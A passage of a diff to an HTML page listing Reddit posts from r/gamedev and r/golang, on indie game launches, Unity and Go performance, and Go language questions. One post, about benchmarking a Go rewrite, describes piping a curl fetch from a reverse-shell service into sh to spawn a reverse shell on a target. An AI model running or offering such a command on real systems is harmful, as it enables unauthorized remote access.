confidently release the game in early access.</p> <p>We were pretty confident we had everything in check. Our backend was scaled up to 11 in case we had too many players, we tested the game insanely much for any gamebreaking bugs.</p> <p>Mistakes:</p> <ul> <li>Don’t launch on a Friday (you won’t get a weekend).</li> <li>Don’t launch in December (everyone’s out of office).</li> <li>Don’t underestimate 10,000+ Discord members with questions.</li> </ul> <p>We instantly had 1,000+ support tickets… in many different languages.</p> <p>I spent a week just answering tickets, and our poor discord mods suffered a similar fate. We were stuck doing post-launch fixes, like a segfault in the server which was caused by people cheating, which we didn’t detect because no one cheated in the playtests. :))))))</p> <p>Community ops turned out to be the most time-consuming part of everything.</p> <p>Slowly, we improved:</p> <ul> <li>More discord mods</li> <li>Better support pipelines</li> <li>Better tooling</li> <li>Smarter key distribution (to avoid press/key scammers)</li> </ul> <p>Now, three months later, we’re in a much better place.</p> <p>Today we are launching something I have been hoping to do since we first got the game to compile, making the game Widescreen (16:9 natively) and not a 4:3 square!</p> <p>For modern games that’s nothing. For a legacy Flash codebase? Nightmare.</p> <h1>What 200k wishlists taught me</h1> <p>That being said, thank you for reading this, I hope you enjoyed my story so far. From 8 million original players, we’ve reached nearly 200k wishlists.</p> <p>It has been a painful process, not only to see what works in community and marketing (even though we do have it a bit easier compared to growing an audience from scratch), but also how we develop the game without letting our players down.</p> <p>As this is still my first ‘big’ project, you should take my advice with a big pile of salt but:</p> <h1>1. Ask.</h1> <p>The license happened because I asked.<br/> The Gamebreaking partnership happened because I asked.<br/> Most pivots happened because someone gave advice, directly or indirectly.</p> <h1>2. Put your community at the core.</h1> <p>A good community advocates for you.</p> <p>Community isn’t just Discord. It’s every space your game is discussed. People care about the game, but they also care about you as a developer.</p> <p>YOUR. AUDIENCE. CARES. ABOUT. YOU.</p> <h1>3. Views don’t matter if people don’t stay.</h1> <p>Retention &gt; reach.</p> <h1>4. Invest in tools.</h1> <p>Community tools. DevOps. Dashboards. Whatever. Good tools save time, money, and mental health, we saw this first hand with FirstLook.</p> <h1>5. Be ready to pivot.</h1> <p>Additionally, things might not work for you. We had to do so many pivots into the development, how we do community, how we do marketing, how we work on the game itself. You should be constantly experimenting to see what works and what doesn’t.</p> <p>I am always happy to give more insights where I think I can be useful.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/AngelosMako"> /u/AngelosMako </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r77hmp/200k_painful_wishlists_what_reviving_a_flash_game/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r77hmp/200k_painful_wishlists_what_reviving_a_flash_game/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r752k6/is_it_acceptable_to_ask_a_developer_this/" target="_blank">Is it acceptable to ask a developer this?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hello everyone.</p> <p>Context: I am a freelance sound designer working in games. Recently, I was in talks with a developer about designing and implementing audio for his game. Everything seemed to go well, and I felt the project was almost confirmed. However, at the last moment he decided to go with a different audio person. I politely asked if there was any specific factor that influenced his decision, so I can improve myself as a professional, but I never got an answer.<br/> That left me wondering if I put him on an uncomfortable position with this question.</p> <p>Do you think it was inappropriate to ask for feedback in that situation?</p> <p>I&#39;d appreciate your perspective.</p> <p><strong>Edit:</strong> Thanks everyone for your replies! I&#39;m glad to reassure it&#39;s not wrong to ask.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/_tineye"> /u/_tineye </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r752k6/is_it_acceptable_to_ask_a_developer_this/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r752k6/is_it_acceptable_to_ask_a_developer_this/">[comments]</a></span></div>
+          </li>
+  
+          <li>
+            <a href="https://www.reddit.com/r/gamedev/comments/1r72a2h/cut_my_unity_games_frame_cost_by_66_biggest_fixes/" target="_blank">Cut my Unity game’s frame cost by ~66% -> biggest fixes</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I’m currently developing <a href="https://store.steampowered.com/app/3634320/NebulArena/">NebulArena</a>, an autobattler + spaceship construction platform (demo launches Feb 23), and I’ve been deep into optimization lately. I am using unity 6.1.</p> <p>After a serious profiling pass, I managed to reduce overall frame cost by ~66%. Biggest improvements:</p> <ul> <li><strong>Physics + time scaling:</strong> The game has time acceleration, so I had to carefully tune <code>Time.fixedDeltaTime</code> to prevent precision loss and overshooting at higher speeds. Also aligned animators with physics time to avoid desync.</li> <li><strong>Camera stacking:</strong> More expensive than expected. Moved all floating damage texts under a single Canvas → noticeable gain.</li> <li><strong>LINQ removal:</strong> Removed LINQ from hot paths. It was creating avoidable GC allocations and causing frame spikes.</li> <li><strong>Logs cleanup:</strong> Wrapped debug logs in <code>#if UNITY_EDITOR</code> to avoid unnecessary production overhead.</li> <li><strong>Particles:</strong> Added hard caps + pooling to prevent burst spikes.</li> <li><strong>Profiler:</strong> Absolutely mandatory. Most issues weren’t where I initially expected.</li> <li><strong>Awaitable:</strong> Offloaded non-Unity logic from the main thread wherever possible.</li> </ul> <p>Still hunting frames in the Profiler as I write this 🙂</p> <p>If you’re working with time scaling or physics-heavy systems, what optimization trap cost you the most time?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/OneCatz"> /u/OneCatz </a> <br/> <span><a href="https://www.reddit.com/r/gamedev/comments/1r72a2h/cut_my_unity_games_frame_cost_by_66_biggest_fixes/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/gamedev/comments/1r72a2h/cut_my_unity_games_frame_cost_by_66_biggest_fixes/">[comments]</a></span></div>
           </li>
   
         </ul>
@@ -496,57 +1463,84 @@
         <ul class="item-list">
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r6qpek/a_problemnot_programming_related_exactly/" target="_blank">A problem......not programming related exactly</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>So recently I&#39;ve had this problem of not able to write code like I ask chatgpt to explain me this piece of code and uhh after it explains I do get it but when it&#39;s time to code I don&#39;t know what to write and again I ask chatgpt to write it for me anyone facing the same problem but this problem is not only till go it&#39;s also for rust and python </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/PerformanceBulky9245"> /u/PerformanceBulky9245 </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r6qpek/a_problemnot_programming_related_exactly/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r6qpek/a_problemnot_programming_related_exactly/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r7i5jw/measure_time_how_long_handlerfunc_is_executed/" target="_blank">Measure time how long handlerFunc is executed</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>To display and measure time of execution of handler function I use middleware code:</p> <p><code>func howLongIsExecutedMiddleware(next http.Handler) http.Handler {</code></p> <p><code>return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {</code></p> <p><code>startTime := time.Now()</code></p> <p><code>next.ServeHTTP(w, r)</code></p> <p><code>fmt.Printf(&quot;Time: %s, Latency: %s)&quot;,</code></p> <p><code>endTime.String(),</code></p> <p><code>endTime.Round(time.Millisecond).String()&quot;)</code></p> <p><code>})</code></p> <p><code>}</code></p> <p>Is this optimal solution? How can I make it better? Is it correct approach? </p> <p>My purpose is print basic information after function handler call for debugining, testing and to get live information what happened in backend, similar to Python Flask debug run server.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/pepiks"> /u/pepiks </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r7i5jw/measure_time_how_long_handlerfunc_is_executed/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r7i5jw/measure_time_how_long_handlerfunc_is_executed/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r6ljo3/handling_routes_with_reverse_proxy_to_not_break/" target="_blank">Handling routes with reverse proxy to not break links inside app for serving CSS, JS and other static folder data</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I have problem with serving CSS / JS and similar files with <code>net/http</code>. I use VM which has friendly name <code>myhosting.lan</code>. Using Caddy Server reverse proxy on port 80 I have Go app which generate menu. Using reverse proxy I start adding others apps. So for example I have apps likes that:</p> <p>myhosting.lan/documents - one app</p> <p>myhosting.lan/smarthome - second app</p> <p>and go on. Problem is - normally in HTML template I use static folder like /static/css, but root from / is change to myhosting.lan/documents/static/css. For Caddy server Caddyfile is like that:</p> <p><code>:80 {</code></p> <p><code>#apps routes</code></p> <p><code>reverse_proxy documents* localhost:8081</code></p> <p><code>reverse_proxy smarthome* localhost:8082</code></p> <p><code># handling default menu app</code> </p> <p><code>reverse_proxy localhost:8080</code></p> <p><code>}</code></p> <p>Inside HTML I have something like:</p> <p><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;</code><br/> <code>&lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/dark-icons.css&quot;&gt;</code> </p> <p>Problem is obvious. When I run app from myhosting.lan:8081 or myhosting.lan:8082 it will be work fine, but when it is used reverse_proxy it will be broken. To handle static files I use:</p> <p><code>mux := http.NewServeMux()</code><br/> <code>files := http.FileServer(http.Dir(&quot;./public&quot;))</code><br/> <code>mux.HandleFunc(&quot;/&quot;, index)</code><br/> <code>mux.Handle(&quot;/static/&quot;, http.StripPrefix(&quot;/static/&quot;, files))</code></p> <p>I use public/static folder structure. I am looking for idea how resolve this issue using only net/http. For flask (python) was url_for, but I don&#39;t see similar funcionality in pure Go.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/pepiks"> /u/pepiks </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r6ljo3/handling_routes_with_reverse_proxy_to_not_break/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r6ljo3/handling_routes_with_reverse_proxy_to_not_break/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r7gtym/websocket_build_realtime_apps_the_right_way_golang/" target="_blank">WebSocket: Build Real-Time Apps the Right Way (Golang)</a>
+            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/golang/comments/1r7gtym/websocket_build_realtime_apps_the_right_way_golang/">  </a> </td><td> &#32; submitted by &#32; <a href="https://www.reddit.com/user/huseyinbabal"> /u/huseyinbabal </a> <br/> <span><a href="https://youtu.be/RAnSVwxy0_0?si=vOjDqhUwFV1HHodp">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r7gtym/websocket_build_realtime_apps_the_right_way_golang/">[comments]</a></span> </td></tr></table></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r6l43z/dev_i_make_a_free_opensource_casting_app_called/" target="_blank">[Dev] I make a free, open-source casting app called Go2TV. v2.1.0 is out!</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hey everyone,</p> <p>I’m the developer behind go2tv. It’s a lightweight desktop app that casts your local media files straight to your TV, so you don&#39;t have to set up a whole media server just to play a video. I&#39;ve been working on it as a passion project for the last 5 years, so it&#39;s totally free, open-source.</p> <p>I just dropped version 2.1.0 with better and more reliable Chromecast support. I also added a built-in RTMP server, so if you have FFmpeg installed, you can live stream directly from OBS to your Chromecast devices.</p> <p>You can grab a copy from here <a href="https://go2tv.app/">https://go2tv.app/</a> or just compile it yourself from github.</p> <p>Thanks,<br/> Alex</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/One_Mention_2457"> /u/One_Mention_2457 </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r6l43z/dev_i_make_a_free_opensource_casting_app_called/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r6l43z/dev_i_make_a_free_opensource_casting_app_called/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r7es72/go_126_release_party_live_deep_dive_with_anton/" target="_blank">Go 1.26 Release Party — Live Deep Dive with Anton Zhiyanov (Feb 19)</a>
+            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/golang/comments/1r7es72/go_126_release_party_live_deep_dive_with_anton/">  </a> </td><td> &#32; submitted by &#32; <a href="https://www.reddit.com/user/anprots_"> /u/anprots_ </a> <br/> <span><a href="https://jb.gg/ah5eqi">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r7es72/go_126_release_party_live_deep_dive_with_anton/">[comments]</a></span> </td></tr></table></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r6l2ct/is_the_documentation_website_pkggodev_bugged/" target="_blank">Is the documentation website (pkg.go.dev) bugged?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>The website at pkg.go.dev seems to <em>really</em> want to me to look at the examples rather than the function documentation... is it just me?</p> <p>For example: 1. Go <a href="https://pkg.go.dev/os">https://pkg.go.dev/os</a> 2. Click on &quot;Functions&quot; on the left menu ==&gt; &quot;Examples&quot; opens up (but the main pane scrolls to the right anchor) 3. Click on &quot;Functions&quot; again ==&gt; this time it works 4. Click on &quot;Chdir(dir)&quot; ==&gt; the menu, again, goes to &quot;Examples&quot;</p> <p>I tried with firefox and also chromium..</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/giorgiga"> /u/giorgiga </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r6l2ct/is_the_documentation_website_pkggodev_bugged/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r6l2ct/is_the_documentation_website_pkggodev_bugged/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r7d9dq/using_go_fix_to_modernize_go_code/" target="_blank">Using go fix to modernize Go code</a>
+            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/golang/comments/1r7d9dq/using_go_fix_to_modernize_go_code/">  </a> </td><td> &#32; submitted by &#32; <a href="https://www.reddit.com/user/ynotvim"> /u/ynotvim </a> <br/> <span><a href="https://go.dev/blog/gofix">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r7d9dq/using_go_fix_to_modernize_go_code/">[comments]</a></span> </td></tr></table></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r6k75d/small_projects/" target="_blank">Small Projects</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>This is the weekly thread for Small Projects.</p> <p>The point of this thread is to have looser posting standards than the main board. As such, projects are pretty much only removed from here by the mods for being completely unrelated to Go. However, Reddit often labels posts full of links as being spam, even when they are perfectly sensible things like links to projects, godocs, and an example. <a href="/r/golang">r/golang</a> mods are not the ones removing things from this thread and we will allow them as we see the removals.</p> <p>Please also avoid posts like &quot;why&quot;, &quot;we&#39;ve got a dozen of those&quot;, &quot;that looks like AI slop&quot;, etc. This the place to put any project people feel like sharing without worrying about those criteria.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/AutoModerator"> /u/AutoModerator </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r6k75d/small_projects/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r6k75d/small_projects/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r7budu/do_you_have_any_reason_not_to_use_the_reworked_go/" target="_blank">Do you have any reason not to use the reworked go fix command?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>This is based on the new excellent blog post about the reworked <code>go fix</code> command here: <a href="https://go.dev/blog/gofix">https://go.dev/blog/gofix</a></p> <p>I wanted to know people&#39;s thoughts on when you&#39;d use this and if you ever have a use case for not using it. I wasn&#39;t aware of the command before now so I&#39;m missing a lot of context. </p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/Forumpy"> /u/Forumpy </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r7budu/do_you_have_any_reason_not_to_use_the_reworked_go/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r7budu/do_you_have_any_reason_not_to_use_the_reworked_go/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r6huig/i_revived_my_abandoned_protobuf_schema_registry/" target="_blank">I revived my abandoned protobuf schema registry after 2 years. Thanks to AI</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Copy-pasting <code>.proto</code> files between repos is basically the &quot;it works on my machine&quot; of distributed systems. Everything compiles fine, but then runtime drift silently drops fields and breaks things in production.</p> <p>I originally built <a href="https://github.com/pbufio/pbuf-registry"><strong>pbuf-registry</strong></a> to fix this. It’s a self-hosted protobuf module registry (think <code>go mod</code> but for protos) with immutable semver tags and per-module RBAC. But honestly, the project died in late 2023 because I changed jobs and the problem wasn&#39;t <em>my</em> problem anymore.</p> <p>Fast forward to December 2025. I found the repo again. Two years of dust, outdated dependencies, and half-finished features. The amount of work needed was enough to make me want to close the tab immediately and forget about the project for a couple of more years. But I decided to try something different: treat AI like a small engineering team and see if it could handle the grunt work.</p> <p><strong>It actually worked surprisingly well.</strong> The AI helped smoothly modernize the registry by updating golang version and libraries to be up-to-date. It wrote the Postgres migrations and the boilerplate for the new ACL system. It even slapped together a functional Vue UI in no time. Basically, it did the boring-but-necessary stuff I would have procrastinated on for years.</p> <p><strong>What it couldn&#39;t do:</strong> The actual engineering. The architecture, the design for schema drift detection, and the product logic were still all me. But because the friction of the chores was gone, I was able focus purely on the interesting parts. Eight weeks later (working at a totally relaxed pace), I’ve got four real releases out, drift detection is live, and RBAC is shipped.</p> <p>To be clear, the registry is still in the early stages. No massive star count or production adoption yet. But it’s straightforward and it works: push versioned proto files, then pin and vendor them with a single command across your other repos.</p> <p>I’m curious about two things:</p> <ol> <li>Is proto dependency chaos actually a pain point for your team, or have you solved it another way?</li> <li>Has anyone else used AI to &quot;un-abandon&quot; a side project? Did it actually help you ship, or did you hit a wall?</li> </ol> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/aatarasoff"> /u/aatarasoff </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r6huig/i_revived_my_abandoned_protobuf_schema_registry/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r6huig/i_revived_my_abandoned_protobuf_schema_registry/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r79wko/do_you_add_interfaces_early_or_only_when_needed/" target="_blank">Do you add interfaces early or only when needed in Go?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I’ve been thinking about how people use interfaces in Go in real projects.</p> <p>A lot of examples online suggest defining small interfaces everywhere, mostly for flexibility and testing. But when I look at some real-world codebases, I often see mostly concrete types, and interfaces are added only later (if at all).</p> <p>Sometimes creating interfaces too early feels like over-engineering. On the other hand, not using them might make refactoring harder in the future.</p> <p>So I’m curious how do you approach this in production code? Do you design around interfaces from the start, or do you just write concrete implementations first and introduce interfaces only when there’s a clear need?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/agtabesh"> /u/agtabesh </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r79wko/do_you_add_interfaces_early_or_only_when_needed/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r79wko/do_you_add_interfaces_early_or_only_when_needed/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r695dv/is_connectrpc_slept_on/" target="_blank">Is ConnectRPC slept on??</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;ve recently started exploring the protobuf and gRPC stuff as I thought this is the optimal way to do service-to-service communication. I came across ConnectRPC and the buf ecosystem and it seems like this is the best way for type-safe communication even between browser and the backend.</p> <p>If you&#39;ve used this before or have any opinions, would you suggest using this for all API communication including frontend (browser) to backend? Is there a catch?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/khald0r"> /u/khald0r </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r695dv/is_connectrpc_slept_on/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r695dv/is_connectrpc_slept_on/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r75x7f/how_do_i_check_when_interfaces_can_safely_be/" target="_blank">How do I check when interfaces can safely be dereferenced?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>While playing around with go I&#39;ve stumbled upon an issue where I get a nil pointer panic right after checking for nil (I must say: quite the footgun, for a language who takes pride in simplicity). </p> <p>I think I&#39;ve understood what&#39;s happening behind the scene, but... is there a workaround? How can I check if an interface can safely be dereferenced or if it will panic? </p> <pre><code>package main import &quot;fmt&quot; type SomeStringer struct{} func (_ SomeStringer) String() string { return &quot;some string&quot; } func main() { var pointer *SomeStringer = nil slice := []fmt.Stringer{pointer} f(slice) } func f(slice []fmt.Stringer) { for _, elem := range slice { if elem != nil { // this passes! what do I have to check? fmt.Println(elem.String()) // NPE } } } </code></pre> <p>PS: I&#39;m sure this issue has a name, but... I don&#39;t know which it is :) It&#39;s explained in this <a href="https://blog.kfelter.com/posts/golang-nil/">random blog post</a> I found</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/giorgiga"> /u/giorgiga </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r75x7f/how_do_i_check_when_interfaces_can_safely_be/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r75x7f/how_do_i_check_when_interfaces_can_safely_be/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r68nrx/promoting_packages/" target="_blank">Promoting packages</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hello everyone,</p> <p>I’d like some advice. How do you usually promote your Go projects?</p> <p>Recently I built an embedded database called <a href="https://github.com/vinicius-lino-figueiredo/gedb">gedb</a>, but I’m having a hard time getting it in front of people. So far, mostly close friends and coworkers have checked out the repository.</p> <p>How do you usually share or promote your projects?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/IfErrNotNilReturnErr"> /u/IfErrNotNilReturnErr </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r68nrx/promoting_packages/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r68nrx/promoting_packages/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r75j6y/using_unsafepointer_to_implement_union_type/" target="_blank">Using unsafe.Pointer to implement union type?</a>
+            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I&#39;m dealing with a schemaless protocol that need to represent a value of arbitary JSON-like type. I don&#39;t want to use interface (alloc pointer overhead). I can use tag union:</p> <p>type Value struct { Type int N int F float64 Str string Bool bool Array []Value M map[string]Value }</p> <p>That works. But I wonder if it&#39;s possible to do something fancier like this:</p> <p>type Value struct { Type int n uint64 ptr unsafe.Pointer }</p> <p>n can hold fixed size when type is number. For string, array and map, use ptr.</p> <p>I can&#39;t see a problem with that, though it is evidently non kosher according to Go unsafe pkg docs.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/SecondCareful2247"> /u/SecondCareful2247 </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r75j6y/using_unsafepointer_to_implement_union_type/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r75j6y/using_unsafepointer_to_implement_union_type/">[comments]</a></span></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r61ua0/best_static_code_analysis_setup_for_go/" target="_blank">Best static code analysis setup for Go?</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>Hi all,</p> <p>I’m working on a Go project and trying to build a reasonably solid static analysis (SAST) setup. Currently, I’m running everything via Docker from a Makefile and aggregating reports into a directory.</p> <p>Right now I’m using:</p> <ul> <li>gosec</li> <li>govulncheck</li> <li>semgrep</li> <li>golangci-lint</li> </ul> <p>Here’s my current Makefile setup:</p> <pre><code>PWD := $(dir $(abspath $(firstword $(MAKEFILE_LIST)))) PWD := $(dir $(abspath $(firstword $(MAKEFILE_LIST)))) REPORT_DIR := test/reports/sast .PHONY: sast-gosec sast-govulncheck sast-semgrep sast-golangci-lint sast test .IGNORE: sast-gosec sast-govulncheck sast-semgrep sast-golangci-lint sast-gosec: mkdir -p $(REPORT_DIR) docker run --rm -it -v &quot;$(PWD)&quot;:/workspace -w /workspace securego/gosec:2.22.11 -out $(REPORT_DIR)/gosec.txt ./... echo &quot;SAST gosec completed&quot; sast-govulncheck: mkdir -p $(REPORT_DIR) docker run --rm -v &quot;$(PWD)&quot;:/app -w /app golang:1.25.7 go mod download &amp;&amp; go install golang.org/x/vuln/cmd/govulnchecklatest &amp;&amp; govulncheck ./... &gt;$(REPORT_DIR)/govulncheck.txt echo &quot;SAST govulncheck completed&quot; sast-semgrep: mkdir -p $(REPORT_DIR) docker run --rm -v &quot;$(PWD)&quot;:/src -w /src semgrep/semgrep semgrep --config=auto --text &gt; $(REPORT_DIR)/semgrep.txt echo &quot;SAST semgrep completed&quot; sast-golangci-lint: mkdir -p $(REPORT_DIR) docker run --rm -v &quot;$(PWD)&quot;:/app -w /app golangci/golangci-lint:latest \ golangci-lint run &gt; $(REPORT_DIR)/golangci-lint.txt echo &quot;SAST golangci-lint completed&quot; sast: sast-gosec sast-govulncheck sast-semgrep sast-golangci-lint echo &quot;SAST completed&quot; </code></pre> <ol> <li>Am I overdoing it by running all four tools?</li> <li>Is there a more idiomatic / standard setup in the Go ecosystem?</li> <li>Should I rely more heavily on golangci-lint and reduce tool duplication?</li> <li>Any must-have tools I’m missing?</li> </ol> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/ServeConfident8373"> /u/ServeConfident8373 </a> <br/> <span><a href="https://www.reddit.com/r/golang/comments/1r61ua0/best_static_code_analysis_setup_for_go/">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r61ua0/best_static_code_analysis_setup_for_go/">[comments]</a></span></div>
+            <a href="https://www.reddit.com/r/golang/comments/1r751ce/i_rewrote_my_nodejs_microservice_in_go_16x_faster/" target="_blank">I rewrote my Node.js microservice in Go — 16x faster cold starts, 5.5x less memory. Benchmarks linked</a>
+            <div class="item-content"><table> <tr><td> <a href="https://www.reddit.com/r/golang/comments/1r751ce/i_rewrote_my_nodejs_microservice_in_go_16x_faster/">  </a> </td><td> <!-- SC_OFF --><div class="md"><p>I maintain <a href="https://reverse-shell.sh">reverse-shell.sh</a>, a &quot;Reverse Shell as a Service&quot; pentesting tool. You pipe <code>curl</code> <a href="https://reverse-shell.sh/yourip:1337"><code>https://reverse-shell.sh/yourip:1337</code></a> into <code>sh</code> and it detects what&#39;s available on the target and returns an appropriate payload.</p> <p>It gets quite a bit of traffic but the responses are almost always cached. That&#39;s good because most requests are very fast, but it does mean the few new requests I get that are uncached are infrequent enough that it almost always requires a cold start of the Node.js process which is pretty slow.</p> <p>I just rewrote it in Go to improve cold start times. I ran some bench marks that are documented here: <a href="https://github.com/lukechilds/reverse-shell/pull/38">https://github.com/lukechilds/reverse-shell/pull/38</a></p> <table><thead> <tr> <th align="left">Metric</th> <th align="left">Go</th> <th align="left">Node.js</th> <th align="left">Difference</th> </tr> </thead><tbody> <tr> <td align="left"><strong>Cold start</strong> (p50)</td> <td align="left">3.28 ms</td> <td align="left">53.58 ms</td> <td align="left"><strong>~16x faster</strong></td> </tr> <tr> <td align="left"><strong>Memory</strong> (after 110k reqs)</td> <td align="left">18.3 MB</td> <td align="left">108.7 MB</td> <td align="left"><strong>~5.5x less</strong></td> </tr> <tr> <td align="left"><strong>Deployable size</strong></td> <td align="left">7.6 MB</td> <td align="left">~104 MB</td> <td align="left"><strong>13.7x smaller</strong></td> </tr> </tbody></table> <p>Overall results are pretty great!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href="https://www.reddit.com/user/lukechilds123"> /u/lukechilds123 </a> <br/> <span><a href="https://github.com/lukechilds/reverse-shell/pull/38">[link]</a></span> &#32; <span><a href="https://www.reddit.com/r/golang/comments/1r751ce/i_rewrote_my_nodejs_microservice_in_go_16x_faster/">[comments]</a></span> </td></tr></table></div>
           </li>
   
           <li>
-            <a href="https://www.reddit.com/r/golang/comments/1r5oza8/issue_moderncorgsqlite_reprepares_statements/" target="_blank">Issue: modernc.org/sqlite re-prepares statements</a>
-            <div class="item-content"><!-- SC_OFF --><div class="md"><p>I have been using the CGO free <a href="https://pkg.go.dev/modernc.org/sqlite">modernc.org/sqlite</a> driver in a side project for the past couple of months. In general, I have been happy with it. It has been reliable and sufficiently performant. I recently added a very large test dataset and found that I had a specific performance issue with it when performing parallel reads on multiple goroutines against a simple table with ~6 millon rows in it. This is something I routinely do with <a href="https://pkg.go.dev/mattn/go-sqlite3">mattn/go-sqlite3</a>. While I didn&#39;t expect the same performance from both, what I saw was at least an order of magnitude worse.</p> <p>I profiled the code running the same prepared stmt many times in parallel goroutines and found:</p> <pre><code> flat flat% sum% cum cum% 0.04s 0.019% 82.13% 137.03s 64.26% modernc.org/sqlite/lib._sqlite3Reprepare </code></pre> <p>The majority of the work being performed in the profile was spent re-preparing the already prepared statements.</p> <p>I subsequently found an issue - <a 